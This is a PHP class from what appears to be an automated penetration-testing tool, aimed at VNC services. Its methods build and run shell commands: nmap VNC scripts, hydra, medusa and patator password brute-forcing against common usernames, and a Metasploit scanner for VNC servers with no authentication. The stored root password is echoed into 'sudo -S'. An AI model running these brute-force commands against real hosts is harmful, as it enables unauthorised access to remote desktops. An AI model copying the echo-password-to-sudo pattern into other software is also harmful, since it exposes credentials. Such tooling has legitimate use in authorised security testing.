<?php


class service2vnc extends service2ssl {


    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
    }


public function service2vnc4exec(){
    $result = "";

        $result .= $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"vnc-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
        
        $query_hydra = "hydra -P \"$this->dico_password.1000\" $this->ip vnc -f -t 12 -e nsr -s $this->port -w 5s 2>/dev/null | grep $this->ip | grep 'password:'  ";
        $result .= $this->cmd("localhost",$query_hydra);
        $result .= $this->auth2login4hydra($this->req_ret_str($query_hydra));
        
        $users_test = array("root","admin","administrator","guest","user","test");
        foreach ($users_test as $user_test){
            $result .= $this->port2auth4dico4medusa("vnc",$user_test);
            $query = "patator vnc_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
            //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
            
        }
        
        return $result;
    
}

public function service2vnc2msf(){
    $this->ssTitre(__FUNCTION__);
    $query = "echo \"db_status\nuse auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS $this->ip\nset RPORT $this->port\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
    return $this->req_ret_str($query);
}


  }
?>
